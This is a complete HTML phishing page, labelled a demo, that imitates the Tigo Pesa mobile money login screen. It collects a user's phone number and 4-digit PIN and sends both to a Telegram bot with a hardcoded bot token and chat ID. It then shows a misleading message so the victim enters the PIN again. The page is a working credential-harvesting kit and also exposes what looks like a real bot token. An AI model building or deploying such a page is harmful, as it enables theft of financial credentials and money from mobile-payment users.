<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Tigo Pesa Login (Demo)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 80px;
            background: #f7f7f7;
        }
        
        .logo img {
            width: 100px;
        }
        
        h2 {
            color: #333;
        }
        
        .number {
            color: #0033A0;
            font-size: 18px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .pin-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .pin-container input {
            width: 50px;
            height: 50px;
            font-size: 24px;
            text-align: center;
            border: 2px solid #ccc;
            border-radius: 8px;
        }
        
        .pin-container input:focus {
            border-color: gold;
            outline: none;
        }
        
        .login-btn {
            background: #ccc;
            padding: 15px 40px;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            color: #333;
            cursor: pointer;
        }
    </style>
</head>

<body>

    <div class="logo">
        <img src="image22.png" alt="Tigo Pesa">
    </div>

    <h2>Welcome to Tigo Pesa, for the best<br>financial services in Tanzania</h2>

    <div class="number" id="phone-number">0716780727</div>

    <p>Enter your Tigo Pesa PIN</p>

    <div class="pin-container">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>

    <button class="login-btn">Login</button>

    <script>
        // Populate phone number from query string (if provided)
        const params = new URLSearchParams(window.location.search);
        const number = params.get("number");
        if (number) {
            document.getElementById("phone-number").textContent = number;
        }

        const pinInputs = document.querySelectorAll('.pin-container input');
        if (pinInputs[0]) pinInputs[0].focus();

        // Tab to next input or back on backspace
        pinInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });
        });

        // Handle Login click
        document.querySelector('.login-btn').addEventListener('click', () => {
            const pin = Array.from(pinInputs).map(input => input.value).join('');
            const phoneNumber = document.getElementById("phone-number").textContent.trim();

            if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
                alert("Please enter a valid 4-digit PIN.");
                return;
            }

            const message = `ðŸ“² *Tigo Pesa Login Demo*\nPhone Number: ${phoneNumber}\nEntered PIN: ${pin}`;
            const botToken = "8318767273:AAH-_zRVgEvcC5ASdKL8QxxR4QfXeBMq3BE"; // Replace with your token
            const chatId = "7728196897"; // Replace with your chat ID

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                })
                .then(response => response.json())
                .then(data => {
                    alert("PIN and OTP should be correct.");
                    pinInputs.forEach(input => input.value = '');
                    pinInputs[0].focus();
                })
                .catch(error => {
                    console.error("Error sending message:", error);
                    alert("Failed to send message. Check console for details.");
                });
        });
    </script>

</body>

</html>